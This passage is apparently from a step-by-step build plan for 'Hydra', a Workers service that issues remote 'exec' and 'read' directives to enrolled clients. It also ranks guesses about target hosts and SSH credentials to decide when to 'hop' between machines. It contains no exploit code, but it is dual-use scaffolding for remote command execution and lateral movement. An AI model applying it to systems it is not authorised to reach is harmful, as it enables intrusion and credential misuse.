- Create: `tests/poll.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/poll.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { SELF, env } from 'cloudflare:test';
import { signRequest } from '../src/hmac';

async function bootstrap(): Promise<{ mission_id: string; session_key: string }> {
  const start = await SELF.fetch('https://h/v1/admin/mission/start', {
    method: 'POST',
    headers: { 'X-Admin-Key': 'dev-admin' },
    body: JSON.stringify({
      fingerprint_expected: 'fp_p', target_allowlist: ['origin', 'kvm2'],
      strict_gold: false, budget_paid_usd: 10, deadline_seconds: 86_400,
    }),
  });
  const { mission_id } = await start.json() as { mission_id: string };
  const reg = await SELF.fetch('https://h/v1/register', {
    method: 'POST',
    body: JSON.stringify({ fingerprint: 'fp_p', platform: 'linux', version: '0.1.0', mission_id }),
  });
  const { session_key } = await reg.json() as { session_key: string };
  return { mission_id, session_key };
}

describe('/v1/poll', () => {
  it('returns a yield directive on first poll for a fresh mission', async () => {
    const { mission_id, session_key } = await bootstrap();
    const ts = Math.floor(Date.now() / 1000);
    const path = `/v1/poll?mission=${mission_id}`;
    const sig = await signRequest(session_key, 'GET', path, '', ts);
    const res = await SELF.fetch(`https://h${path}`, {
      headers: { 'X-Hydra-Sig': sig, 'X-Hydra-Ts': String(ts) },
    });
    expect(res.status).toBe(200);
    const directive = await res.json() as { op: string };
    expect(['exec', 'read', 'yield', 'terminate']).toContain(directive.op);
  });

  it('rejects bad signature', async () => {
    const { mission_id } = await bootstrap();
    const ts = Math.floor(Date.now() / 1000);
    const res = await SELF.fetch(`https://h/v1/poll?mission=${mission_id}`, {
      headers: { 'X-Hydra-Sig': 'deadbeef', 'X-Hydra-Ts': String(ts) },
    });
    expect(res.status).toBe(401);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/poll.test.ts
```

Expected: FAIL — /v1/poll not wired.

- [ ] **Step 3: Write minimal implementation**

`src/endpoints/poll.ts`:

```typescript
import type { Env } from '../index';
import { verifyRequest } from '../hmac';

export async function handlePoll(req: Request, env: Env): Promise<Response> {
  const url = new URL(req.url);
  const mission_id = url.searchParams.get('mission');
  if (!mission_id) return new Response('mission required', { status: 400 });

  const session_key = await env.HYDRA_KV.get(`session:${mission_id}`);
  if (!session_key) return new Response('no session', { status: 401 });

  const sig = req.headers.get('X-Hydra-Sig') ?? '';
  const ts = parseInt(req.headers.get('X-Hydra-Ts') ?? '0', 10);
  const ok = await verifyRequest(session_key, 'GET', url.pathname + url.search, '', ts, sig);
  if (!ok) return new Response('bad sig', { status: 401 });

  const id = env.MISSION_DO.idFromName(mission_id);
  const stub = env.MISSION_DO.get(id);
  return stub.fetch('https://do/next-directive', { method: 'POST' });
}
```

`src/mission-do.ts` — add inside `fetch()` route table:

```typescript
if (route === 'next-directive') return this.nextDirective();
```

And the method:

```typescript
private async nextDirective(): Promise<Response> {
  if (!this.mission) return new Response('not initialized', { status: 404 });
  // Stub action picker — replaced by tick engine in Phase F.
  const op_id = `op_${crypto.randomUUID().slice(0, 8)}`;
  this.mission.tick += 1;
  await this.state.storage.put('mission', this.mission);
  return Response.json({ id: op_id, op: 'yield', sleep_s: 5 });
}
```

`src/index.ts` — add route:

```typescript
import { handlePoll } from './endpoints/poll';
// ...inside fetch():
if (url.pathname === '/v1/poll' && req.method === 'GET') return handlePoll(req, env);
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/poll.test.ts
```

Expected: PASS, 2 tests.

- [ ] **Step 5: Commit**

```bash
git add src/endpoints/poll.ts src/mission-do.ts src/index.ts tests/poll.test.ts
git commit -m "feat: /v1/poll endpoint with HMAC verify + stub action picker"
```

---

### Task 9: /report endpoint

**Files:**
- Create: `src/endpoints/report.ts`
- Modify: `src/mission-do.ts` (add ingest stub)
- Modify: `src/index.ts`
- Create: `tests/report.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/report.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { SELF } from 'cloudflare:test';
import { signRequest } from '../src/hmac';

async function bootstrap(): Promise<{ mission_id: string; session_key: string }> {
  const start = await SELF.fetch('https://h/v1/admin/mission/start', {
    method: 'POST', headers: { 'X-Admin-Key': 'dev-admin' },
    body: JSON.stringify({
      fingerprint_expected: 'fp_r', target_allowlist: ['origin'],
      strict_gold: false, budget_paid_usd: 10, deadline_seconds: 86_400,
    }),
  });
  const { mission_id } = await start.json() as { mission_id: string };
  const reg = await SELF.fetch('https://h/v1/register', {
    method: 'POST',
    body: JSON.stringify({ fingerprint: 'fp_r', platform: 'linux', version: '0.1.0', mission_id }),
  });
  const { session_key } = await reg.json() as { session_key: string };
  return { mission_id, session_key };
}

describe('/v1/report', () => {
  it('accepts a valid report envelope', async () => {
    const { mission_id, session_key } = await bootstrap();
    const body = JSON.stringify({ mission_id, op_id: 'op_x', ok: true, data: { stdout: 'hi' }, wall_ms: 4 });
    const ts = Math.floor(Date.now() / 1000);
    const sig = await signRequest(session_key, 'POST', '/v1/report', body, ts);
    const res = await SELF.fetch('https://h/v1/report', {
      method: 'POST',
      headers: { 'X-Hydra-Sig': sig, 'X-Hydra-Ts': String(ts), 'Content-Type': 'application/json' },
      body,
    });
    expect(res.status).toBe(200);
  });

  it('rejects malformed envelope', async () => {
    const { mission_id, session_key } = await bootstrap();
    const body = JSON.stringify({ mission_id, garbage: true });
    const ts = Math.floor(Date.now() / 1000);
    const sig = await signRequest(session_key, 'POST', '/v1/report', body, ts);
    const res = await SELF.fetch('https://h/v1/report', {
      method: 'POST',
      headers: { 'X-Hydra-Sig': sig, 'X-Hydra-Ts': String(ts), 'Content-Type': 'application/json' },
      body,
    });
    expect(res.status).toBe(400);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/report.test.ts
```

Expected: FAIL — endpoint not wired.

- [ ] **Step 3: Write minimal implementation**

`src/endpoints/report.ts`:

```typescript
import type { Env } from '../index';
import { verifyRequest } from '../hmac';
import { isReportEnvelope } from '../types';

export async function handleReport(req: Request, env: Env): Promise<Response> {
  const raw = await req.text();
  let body: { mission_id?: string; [k: string]: unknown };
  try { body = JSON.parse(raw); } catch { return new Response('bad json', { status: 400 }); }
  if (!body.mission_id || typeof body.mission_id !== 'string') {
    return new Response('mission_id required', { status: 400 });
  }
  const mission_id = body.mission_id;
  const session_key = await env.HYDRA_KV.get(`session:${mission_id}`);
  if (!session_key) return new Response('no session', { status: 401 });

  const sig = req.headers.get('X-Hydra-Sig') ?? '';
  const ts = parseInt(req.headers.get('X-Hydra-Ts') ?? '0', 10);
  const ok = await verifyRequest(session_key, 'POST', '/v1/report', raw, ts, sig);
  if (!ok) return new Response('bad sig', { status: 401 });

  const { mission_id: _, ...envelope } = body;
  if (!isReportEnvelope(envelope)) return new Response('bad envelope', { status: 400 });

  const id = env.MISSION_DO.idFromName(mission_id);
  const stub = env.MISSION_DO.get(id);
  return stub.fetch('https://do/ingest', { method: 'POST', body: JSON.stringify(envelope) });
}
```

`src/mission-do.ts` — add route + stub:

```typescript
if (route === 'ingest') return this.ingest(req);
// ...
private async ingest(req: Request): Promise<Response> {
  if (!this.mission) return new Response('not initialized', { status: 404 });
  const env = await req.json();
  // Phase F replaces this with rule-engine update.
  await this.state.storage.put(`tick:${this.mission.tick}`, env);
  return new Response('ok');
}
```

`src/index.ts`:

```typescript
import { handleReport } from './endpoints/report';
if (url.pathname === '/v1/report' && req.method === 'POST') return handleReport(req, env);
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/report.test.ts
```

Expected: PASS, 2 tests.

- [ ] **Step 5: Commit**

```bash
git add src/endpoints/report.ts src/mission-do.ts src/index.ts tests/report.test.ts
git commit -m "feat: /v1/report endpoint with envelope validation"
```

---

### Task 10: End-to-end mock script loop (Miniflare)

**Files:**
- Create: `tests/e2e-mock-script.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/e2e-mock-script.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { SELF } from 'cloudflare:test';
import { signRequest } from '../src/hmac';

async function poll(mission_id: string, session_key: string) {
  const ts = Math.floor(Date.now() / 1000);
  const path = `/v1/poll?mission=${mission_id}`;
  const sig = await signRequest(session_key, 'GET', path, '', ts);
  const res = await SELF.fetch(`https://h${path}`, {
    headers: { 'X-Hydra-Sig': sig, 'X-Hydra-Ts': String(ts) },
  });
  return res.json() as Promise<{ id: string; op: string; sleep_s?: number }>;
}

async function report(mission_id: string, session_key: string, op_id: string) {
  const body = JSON.stringify({ mission_id, op_id, ok: true, data: {}, wall_ms: 1 });
  const ts = Math.floor(Date.now() / 1000);
  const sig = await signRequest(session_key, 'POST', '/v1/report', body, ts);
  return SELF.fetch('https://h/v1/report', {
    method: 'POST',
    headers: { 'X-Hydra-Sig': sig, 'X-Hydra-Ts': String(ts), 'Content-Type': 'application/json' },
    body,
  });
}

describe('mock script loop', () => {
  it('completes 5 poll/report cycles', async () => {
    const start = await SELF.fetch('https://h/v1/admin/mission/start', {
      method: 'POST', headers: { 'X-Admin-Key': 'dev-admin' },
      body: JSON.stringify({
        fingerprint_expected: 'fp_e2e', target_allowlist: ['origin', 'kvm2'],
        strict_gold: false, budget_paid_usd: 10, deadline_seconds: 86_400,
      }),
    });
    const { mission_id } = await start.json() as { mission_id: string };
    const reg = await SELF.fetch('https://h/v1/register', {
      method: 'POST',
      body: JSON.stringify({ fingerprint: 'fp_e2e', platform: 'linux', version: '0.1.0', mission_id }),
    });
    const { session_key } = await reg.json() as { session_key: string };

    for (let i = 0; i < 5; i++) {
      const d = await poll(mission_id, session_key);
      expect(d.op).toBeDefined();
      const r = await report(mission_id, session_key, d.id);
      expect(r.status).toBe(200);
    }
  });
});
```

- [ ] **Step 2: Run test to verify it fails or passes**

```bash
npx vitest run tests/e2e-mock-script.test.ts
```

Expected: PASS (this exercises the full Phase B surface; if any prior task is broken, this exposes it).

- [ ] **Step 3: No new implementation needed**

This task is a verification gate — it confirms Phase B integrates cleanly. If it fails, fix the broken endpoint and re-run.

- [ ] **Step 4: Run typecheck**

```bash
npx tsc --noEmit
```

Expected: 0 errors.

- [ ] **Step 5: Commit**

```bash
git add tests/e2e-mock-script.test.ts
git commit -m "test: end-to-end mock script loop (5 tick cycles)"
```

---

## Phase C — Bayesian engine (Tasks 11–15)

### Task 11: Belief graph data structures

**Files:**
- Create: `src/engine/beliefs.ts`
- Create: `tests/engine/beliefs.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/engine/beliefs.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { newHypothesis, addCandidate, getCandidate } from '../../src/engine/beliefs';

describe('belief graph primitives', () => {
  it('creates an empty hypothesis with thresholds', () => {
    const h = newHypothesis('h:target-address', 'target-address');
    expect(h.id).toBe('h:target-address');
    expect(h.candidates).toEqual([]);
    expect(h.collapseThreshold).toBeCloseTo(0.2);
    expect(h.convergeThreshold).toBeCloseTo(0.9);
    expect(h.status).toBe('open');
  });

  it('adds a candidate with starting logit', () => {
    let h = newHypothesis('h:x', 'target-address');
    h = addCandidate(h, '72.61.65.34', 0);
    expect(h.candidates).toHaveLength(1);
    expect(h.candidates[0]!.value).toBe('72.61.65.34');
    expect(h.candidates[0]!.logit).toBe(0);
  });

  it('addCandidate is idempotent on value', () => {
    let h = newHypothesis('h:x', 'target-address');
    h = addCandidate(h, 'a', 0);
    h = addCandidate(h, 'a', 5);
    expect(h.candidates).toHaveLength(1);
  });

  it('getCandidate returns by value or undefined', () => {
    let h = newHypothesis('h:x', 'target-address');
    h = addCandidate(h, 'a', 0);
    expect(getCandidate(h, 'a')?.value).toBe('a');
    expect(getCandidate(h, 'b')).toBeUndefined();
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/engine/beliefs.test.ts
```

Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

`src/engine/beliefs.ts`:

```typescript
export type HypothesisType =
  | 'target-address' | 'target-credentials' | 'network-path'
  | 'auth-method' | 'proxy-jump-chain';

export type HypothesisStatus = 'open' | 'converging' | 'converged' | 'collapsed';

export interface Evidence {
  note: string;
  source_class: string;
  llr: number;
  tick: number;
}

export interface Candidate {
  value: string;
  logit: number;
  posterior: number;
  evidence: Evidence[];
  last_update_tick: number;
}

export interface Hypothesis {
  id: string;
  type: HypothesisType;
  critical: boolean;
  candidates: Candidate[];
  status: HypothesisStatus;
  collapseThreshold: number;
  convergeThreshold: number;
  collapsePlan: string;
}

export function newHypothesis(id: string, type: HypothesisType, critical = true): Hypothesis {
  return {
    id, type, critical,
    candidates: [],
    status: 'open',
    collapseThreshold: 0.2,
    convergeThreshold: 0.9,
    collapsePlan: 'enqueue-tier2-probes',
  };
}

export function addCandidate(h: Hypothesis, value: string, logit: number): Hypothesis {
  if (h.candidates.find(c => c.value === value)) return h;
  return {
    ...h,
    candidates: [
      ...h.candidates,
      { value, logit, posterior: 0, evidence: [], last_update_tick: 0 },
    ],
  };
}

export function getCandidate(h: Hypothesis, value: string): Candidate | undefined {
  return h.candidates.find(c => c.value === value);
}

export function topCandidate(h: Hypothesis): Candidate | undefined {
  if (h.candidates.length === 0) return undefined;
  return [...h.candidates].sort((a, b) => b.posterior - a.posterior)[0];
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/engine/beliefs.test.ts
```

Expected: PASS, 4 tests.

- [ ] **Step 5: Commit**

```bash
git add src/engine/beliefs.ts tests/engine/beliefs.test.ts
git commit -m "feat: belief graph primitives (hypothesis + candidate)"
```

---

### Task 12: Softmax posterior normalization

**Files:**
- Modify: `src/engine/beliefs.ts` (add softmax)
- Create: `tests/engine/softmax.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/engine/softmax.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { softmaxPosteriors, newHypothesis, addCandidate } from '../../src/engine/beliefs';

describe('softmax posteriors', () => {
  it('uniform logits → equal posteriors summing to 1', () => {
    let h = newHypothesis('h', 'target-address');
    h = addCandidate(h, 'a', 0);
    h = addCandidate(h, 'b', 0);
    h = addCandidate(h, 'c', 0);
    h = softmaxPosteriors(h);
    h.candidates.forEach(c => expect(c.posterior).toBeCloseTo(1 / 3, 5));
    expect(h.candidates.reduce((s, c) => s + c.posterior, 0)).toBeCloseTo(1, 5);
  });

  it('large logit dominates', () => {
    let h = newHypothesis('h', 'target-address');
    h = addCandidate(h, 'big', 10);
    h = addCandidate(h, 'small', 0);
    h = softmaxPosteriors(h);
    const big = h.candidates.find(c => c.value === 'big')!;
    expect(big.posterior).toBeGreaterThan(0.99);
  });

  it('numerically stable for huge logits', () => {
    let h = newHypothesis('h', 'target-address');
    h = addCandidate(h, 'a', 1000);
    h = addCandidate(h, 'b', 1001);
    h = softmaxPosteriors(h);
    expect(h.candidates.every(c => Number.isFinite(c.posterior))).toBe(true);
    expect(h.candidates.reduce((s, c) => s + c.posterior, 0)).toBeCloseTo(1, 5);
  });

  it('empty hypothesis: no-op', () => {
    let h = newHypothesis('h', 'target-address');
    h = softmaxPosteriors(h);
    expect(h.candidates).toEqual([]);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/engine/softmax.test.ts
```

Expected: FAIL — `softmaxPosteriors` not exported.

- [ ] **Step 3: Append to `src/engine/beliefs.ts`**

```typescript
export function softmaxPosteriors(h: Hypothesis): Hypothesis {
  if (h.candidates.length === 0) return h;
  const maxLogit = Math.max(...h.candidates.map(c => c.logit));
  const exps = h.candidates.map(c => Math.exp(c.logit - maxLogit));
  const sum = exps.reduce((s, x) => s + x, 0);
  return {
    ...h,
    candidates: h.candidates.map((c, i) => ({ ...c, posterior: exps[i]! / sum })),
  };
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/engine/softmax.test.ts
```

Expected: PASS, 4 tests.

- [ ] **Step 5: Commit**

```bash
git add src/engine/beliefs.ts tests/engine/softmax.test.ts
git commit -m "feat: numerically-stable softmax posterior normalization"
```

---

### Task 13: Apply observation (log-odds Bayesian update)

**Files:**
- Modify: `src/engine/beliefs.ts`
- Create: `tests/engine/apply.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/engine/apply.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { newHypothesis, addCandidate, applyObservation } from '../../src/engine/beliefs';

describe('applyObservation', () => {
  it('adds new candidates from observation with starting logit ~ logit(0.05)', () => {
    let h = newHypothesis('h:target-address', 'target-address');
    h = applyObservation(h, {
      source_class: 'config-file',
      note: 'ssh-config-scan',
      newCandidates: ['10.0.0.1'],
      llrByCandidate: {},
    }, 1);
    const c = h.candidates.find(x => x.value === '10.0.0.1')!;
    expect(c).toBeDefined();
    expect(c.logit).toBeCloseTo(Math.log(0.05 / 0.95), 5);
  });

  it('boosts logit by LLR for matched candidates', () => {
    let h = newHypothesis('h', 'target-address');
    h = addCandidate(h, '1.2.3.4', 0);
    h = applyObservation(h, {
      source_class: 'cfg', note: 'n',
      newCandidates: [],
      llrByCandidate: { '1.2.3.4': 4.0 },
    }, 5);
    const c = h.candidates.find(x => x.value === '1.2.3.4')!;
    expect(c.logit).toBeCloseTo(4.0, 5);
    expect(c.evidence).toHaveLength(1);
    expect(c.evidence[0]!.tick).toBe(5);
    expect(c.evidence[0]!.llr).toBe(4.0);
  });

  it('ignores zero LLRs (no evidence appended)', () => {
    let h = newHypothesis('h', 'target-address');
    h = addCandidate(h, 'a', 0);
    h = applyObservation(h, {
      source_class: 'cfg', note: 'n',
      newCandidates: [],
      llrByCandidate: { a: 0 },
    }, 1);
    expect(h.candidates[0]!.evidence).toEqual([]);
  });

  it('renormalizes posteriors after update', () => {
    let h = newHypothesis('h', 'target-address');
    h = addCandidate(h, 'a', 0);
    h = addCandidate(h, 'b', 0);
    h = applyObservation(h, {
      source_class: 'cfg', note: 'n',
      newCandidates: [],
      llrByCandidate: { a: 5 },
    }, 1);
    const a = h.candidates.find(c => c.value === 'a')!;
    const b = h.candidates.find(c => c.value === 'b')!;
    expect(a.posterior).toBeGreaterThan(b.posterior);
    expect(a.posterior + b.posterior).toBeCloseTo(1, 5);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/engine/apply.test.ts
```

Expected: FAIL — `applyObservation` not exported.

- [ ] **Step 3: Append to `src/engine/beliefs.ts`**

```typescript
export interface Observation {
  source_class: string;
  note: string;
  newCandidates: string[];
  llrByCandidate: Record<string, number>;
}

export function applyObservation(h: Hypothesis, obs: Observation, tick: number): Hypothesis {
  const startingLogit = Math.log(0.05 / 0.95);
  let next = h;
  for (const v of obs.newCandidates) {
    next = addCandidate(next, v, startingLogit);
  }
  next = {
    ...next,
    candidates: next.candidates.map(c => {
      const llr = obs.llrByCandidate[c.value] ?? 0;
      if (llr === 0) return c;
      return {
        ...c,
        logit: c.logit + llr,
        last_update_tick: tick,
        evidence: [...c.evidence, { note: obs.note, source_class: obs.source_class, llr, tick }],
      };
    }),
  };
  return softmaxPosteriors(next);
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/engine/apply.test.ts
```

Expected: PASS, 4 tests.

- [ ] **Step 5: Commit**

```bash
git add src/engine/beliefs.ts tests/engine/apply.test.ts
git commit -m "feat: log-odds Bayesian update with evidence trail"
```

---

### Task 14: Threshold detection (collapse / converge / thrash)

**Files:**
- Modify: `src/engine/beliefs.ts`
- Create: `tests/engine/thresholds.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/engine/thresholds.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import {
  newHypothesis, addCandidate, applyObservation,
  isConverged, isCollapsed, isThrashing, recomputeStatus,
} from '../../src/engine/beliefs';

describe('threshold detection', () => {
  it('isConverged true when top posterior > convergeThreshold', () => {
    let h = newHypothesis('h', 'target-address');
    h = addCandidate(h, 'a', 10);
    h = addCandidate(h, 'b', 0);
    h = applyObservation(h, { source_class: 's', note: 'n', newCandidates: [], llrByCandidate: {} }, 1);
    expect(isConverged(h)).toBe(true);
  });

  it('isCollapsed true when top posterior < collapseThreshold', () => {
    let h = newHypothesis('h', 'target-address');
    for (const v of ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h']) h = addCandidate(h, v, 0);
    h = applyObservation(h, { source_class: 's', note: 'n', newCandidates: [], llrByCandidate: {} }, 1);
    expect(isCollapsed(h)).toBe(true);
  });

  it('recomputeStatus marks converged', () => {
    let h = newHypothesis('h', 'target-address');
    h = addCandidate(h, 'a', 10);
    h = applyObservation(h, { source_class: 's', note: 'n', newCandidates: [], llrByCandidate: {} }, 1);
    h = recomputeStatus(h);
    expect(h.status).toBe('converged');
  });

  it('isThrashing true when top candidate flips within window', () => {
    let h = newHypothesis('h', 'target-address');
    h = addCandidate(h, 'a', 0);
    h = addCandidate(h, 'b', 0);
    h.candidates[0]!.evidence = [
      { note: 'n', source_class: 's', llr: 3, tick: 1 },
      { note: 'n', source_class: 's', llr: -3, tick: 2 },
      { note: 'n', source_class: 's', llr: 3, tick: 3 },
    ];
    expect(isThrashing(h, /* recentTicks */ 5)).toBe(true);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/engine/thresholds.test.ts
```

Expected: FAIL — functions not exported.

- [ ] **Step 3: Append to `src/engine/beliefs.ts`**

```typescript
export function isConverged(h: Hypothesis): boolean {
  const top = topCandidate(h);
  return !!top && top.posterior > h.convergeThreshold;
}

export function isCollapsed(h: Hypothesis): boolean {
  const top = topCandidate(h);
  return !!top && top.posterior < h.collapseThreshold;
}

export function isThrashing(h: Hypothesis, recentTicks: number): boolean {
  const top = topCandidate(h);
  if (!top) return false;
  const recent = top.evidence.filter(e => e.tick > 0).slice(-recentTicks);
  let flips = 0;
  let prevSign = 0;
  for (const e of recent) {
    const sign = Math.sign(e.llr);
    if (sign !== 0 && prevSign !== 0 && sign !== prevSign) flips++;
    if (sign !== 0) prevSign = sign;
  }
  return flips >= 2;
}

export function recomputeStatus(h: Hypothesis): Hypothesis {
  if (isConverged(h)) return { ...h, status: 'converged' };
  if (isCollapsed(h)) return { ...h, status: 'collapsed' };
  if (h.candidates.length > 0) return { ...h, status: 'converging' };
  return { ...h, status: 'open' };
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/engine/thresholds.test.ts
```

Expected: PASS, 4 tests.

- [ ] **Step 5: Commit**

```bash
git add src/engine/beliefs.ts tests/engine/thresholds.test.ts
git commit -m "feat: convergence / collapse / thrash detection"
```

---

### Task 15: Confidence-to-attempt-hop computation

**Files:**
- Create: `src/engine/confidence.ts`
- Create: `tests/engine/confidence.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/engine/confidence.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { confidenceToAttemptHop } from '../../src/engine/confidence';
import { newHypothesis, addCandidate, applyObservation } from '../../src/engine/beliefs';

describe('confidenceToAttemptHop', () => {
  it('returns 0 if no address hypothesis', () => {
    expect(confidenceToAttemptHop({})).toBe(0);
  });

  it('multiplies posteriors and feasibility', () => {
    let addr = newHypothesis('h:target-address', 'target-address');
    addr = addCandidate(addr, '1.1.1.1', 4);
    addr = applyObservation(addr, { source_class: 's', note: 'n', newCandidates: [], llrByCandidate: {} }, 1);
    let cred = newHypothesis('h:target-credentials', 'target-credentials');
    cred = addCandidate(cred, '~/.ssh/k', 3);
    cred = applyObservation(cred, { source_class: 's', note: 'n', newCandidates: [], llrByCandidate: {} }, 1);
    const c = confidenceToAttemptHop({ 'h:target-address': addr, 'h:target-credentials': cred });
    expect(c).toBeGreaterThan(0);
    expect(c).toBeLessThanOrEqual(1);
  });

  it('penalizes unresolved contradictions', () => {
    let addr = newHypothesis('h:target-address', 'target-address');
    addr = addCandidate(addr, 'a', 5);
    addr = addCandidate(addr, 'b', 4);
    addr = applyObservation(addr, { source_class: 's', note: 'n', newCandidates: [], llrByCandidate: {} }, 1);
    let cred = newHypothesis('h:target-credentials', 'target-credentials');
    cred = addCandidate(cred, 'k', 5);
    cred = applyObservation(cred, { source_class: 's', note: 'n', newCandidates: [], llrByCandidate: {} }, 1);
    const c = confidenceToAttemptHop({ 'h:target-address': addr, 'h:target-credentials': cred });
    expect(c).toBeLessThan(1);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/engine/confidence.test.ts
```

Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

`src/engine/confidence.ts`:

```typescript
import type { Hypothesis } from './beliefs';
import { topCandidate } from './beliefs';

export interface FeasibilityFn {
  (authMethod: string): number;
}

export const defaultFeasibility: FeasibilityFn = (m) => {
  if (m === 'ssh-keyfile') return 1.0;
  if (m === 'ssh-password') return 0.7;
  return 0.5;
};

export function confidenceToAttemptHop(
  beliefs: Record<string, Hypothesis>,
  authMethod = 'ssh-keyfile',
  feasibility: FeasibilityFn = defaultFeasibility,
): number {
  const addr = beliefs['h:target-address'];
  const cred = beliefs['h:target-credentials'];
  if (!addr || !cred) return 0;
  const topAddr = topCandidate(addr);
  const topCred = topCandidate(cred);
  if (!topAddr || !topCred) return 0;
  const contradictionPenalty = unresolvedContradictionPenalty(beliefs);
  return topAddr.posterior * topCred.posterior * feasibility(authMethod) * (1 - contradictionPenalty);
}

function unresolvedContradictionPenalty(beliefs: Record<string, Hypothesis>): number {
  const open = Object.values(beliefs).filter(h => h.critical && h.status === 'converging');
  if (open.length === 0) return 0;
  const avgRunnerUp = open
    .map(h => {
      const sorted = [...h.candidates].sort((a, b) => b.posterior - a.posterior);
      return sorted[1]?.posterior ?? 0;
    })
    .reduce((s, x) => s + x, 0) / open.length;
  return Math.min(0.5, avgRunnerUp);
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/engine/confidence.test.ts
```

Expected: PASS, 3 tests.

- [ ] **Step 5: Commit**

```bash
git add src/engine/confidence.ts tests/engine/confidence.test.ts
git commit -m "feat: confidence-to-attempt-hop with contradiction penalty"
```

---

## Phase D — LLM router (Tasks 16–19)

### Task 16: Workers AI client (routine calls only)

**Files:**
- Create: `src/llm/workers-ai.ts`
- Create: `tests/llm/workers-ai.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/llm/workers-ai.test.ts`:

```typescript
import { describe, it, expect } from 'vitest';
import { env } from 'cloudflare:test';
import { workersAiCall } from '../../src/llm/workers-ai';

describe('workersAiCall', () => {
  it('returns text and reports tokens=estimated, cost=0', async () => {
    const r = await workersAiCall(env.AI, {
      shape: 'classify',
      system: 'You are a strict classifier. Reply with one of: yes, no, unclear.',
      user: 'Is "kvm2" a hostname?',
    });
    expect(r.provider).toBe('workers-ai');
    expect(r.model).toBe('@cf/meta/llama-3.1-8b-instruct');
    expect(r.costUsd).toBe(0);
    expect(r.isPaidTier).toBe(false);
    expect(r.output.length).toBeGreaterThan(0);
  });

  it('refuses sanity_check shape', async () => {
    await expect(workersAiCall(env.AI, {
      shape: 'sanity_check', system: 's', user: 'u',
    })).rejects.toThrow(/sanity_check/);
  });
});
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run tests/llm/workers-ai.test.ts
```

Expected: FAIL — module not found.

- [ ] **Step 3: Write minimal implementation**

`src/llm/workers-ai.ts`:

```typescript
import type { BrainCall, BrainResponse } from './router';

const MODEL = '@cf/meta/llama-3.1-8b-instruct';

export async function workersAiCall(ai: Ai, req: BrainCall): Promise<BrainResponse> {
  if (req.shape === 'sanity_check') {
    throw new Error('Workers AI 8B disallowed for sanity_check (codex §4.1 — 70B-class minimum)');
  }
  const r = await ai.run(MODEL as never, {
    messages: [
      { role: 'system', content: req.system },
      { role: 'user', content: req.user },
    ],
    max_tokens: 256,
  } as never) as { response: string };
  const text = r.response ?? '';
  return {
    provider: 'workers-ai',
    model: MODEL,
    output: text,
    tokensUsed: estimateTokens(req.system + req.user + text),
    costUsd: 0,
    isPaidTier: false,
  };
}

export function estimateTokens(s: string): number {
  return Math.ceil(s.length / 4);
}
```

(Note: this test exercises a real Workers AI binding under Miniflare. If the test runner does not have Workers AI mocked, gate this test behind `if (process.env.SKIP_AI_TESTS) it.skip(...)`. Document this in the test file header. For CI, add an `AI_MOCK` flag and have `workers-ai.ts` fall back to a deterministic stub when `env.AI_MOCK === '1'`.)

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run tests/llm/workers-ai.test.ts
```

Expected: PASS, 2 tests (the sanity_check refusal test always passes; the live AI test depends on Miniflare AI binding).

- [ ] **Step 5: Commit**

```bash
git add src/llm/workers-ai.ts tests/llm/workers-ai.test.ts
git commit -m "feat: Workers AI client (8B routine calls only)"
```

---

### Task 17: Groq client (70B sanity-eligible)

**Files:**
- Create: `src/llm/groq.ts`
- Create: `tests/llm/groq.test.ts`

- [ ] **Step 1: Write the failing test**

`tests/llm/groq.test.ts`:

```typescript
import { describe, it, expect, vi } from 'vitest';
import { groqCall } from '../../src/llm/groq';

describe('groqCall', () => {
  it('posts to Groq chat completions and parses response', async () => {
    const fetchMock = vi.fn().mockResolvedValue(new Response(JSON.stringify({
      choices: [{ message: { content: 'GO' } }],
      usage: { total_tokens: 42 },
    }), { status: 200 }));
    const r = await groqCall('test_api_key', {
      shape: 'sanity_check', system: 's', user: 'u',
    }, fetchMock as unknown as typeof fetch);
    expect(r.provider).toBe('groq');
    expect(r.model).toBe('llama-3.3-70b-versatile');
    expect(r.output).toBe('GO');
    expect(r.tokensUsed).toBe(42);
    expect(r.costUsd).toBe(0);
    expect(r.isPaidTier).toBe(false);
  });

  it('throws RateLimited on 429', async () => {
    const fetchMock = vi.fn().mockResolvedValue(new Response('{}', { status: 429 }));
    await expect(groqCall('key', { shape: 'classify', system: 's', user: 'u' }, fetchMock as never))
      .rejects.toMatchObject({ name: 'RateLimited' });
  });

